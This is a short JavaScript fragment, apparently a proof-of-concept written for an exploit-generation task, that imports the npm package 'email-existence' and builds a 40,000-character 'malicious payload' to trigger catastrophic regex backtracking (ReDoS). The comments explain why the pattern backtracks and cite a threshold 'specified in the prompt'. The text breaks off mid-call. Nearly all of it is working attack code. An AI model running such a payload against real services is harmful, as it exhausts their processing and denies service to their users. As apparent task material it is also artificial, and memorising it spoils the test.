   // 1. Import the vulnerable module
   const emailExistence = require('email-existence');

   // 2. Craft the malicious payload
   // The regex / ^\S+@\S+$ / contains two unbounded greedy quantifiers (\S+) 
   // surrounding a literal '@'. When the engine processes a long string that 
   // completely lacks an '@', it greedily consumes every character with the first \S+.
   // Upon matching failure, the engine must backtrack one character at a time,
   // repeatedly re-evaluating the subsequent \S+ and '@' literals.
   // By setting the length to 40,000, we ensure the internal backtrack counter
   // exceeds the runtime safeguard threshold of 30,000 specified in the prompt.
   const maliciousEmail = 'a'.repeat(40000);

   // 3. Trigger the vulnerable code path
   return new Promise((resolve, reject) => {
     emailExistence(maliciousEmail, (err, result) => {
